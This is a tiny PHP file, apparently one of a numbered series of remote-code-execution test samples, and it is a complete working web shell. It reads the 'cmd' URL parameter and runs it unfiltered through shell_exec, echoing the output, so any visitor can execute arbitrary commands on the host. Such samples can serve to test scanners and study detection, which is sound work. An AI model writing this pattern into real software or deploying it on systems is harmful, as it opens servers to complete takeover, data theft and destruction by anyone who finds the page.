<?php
// RCE test variation #1398
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>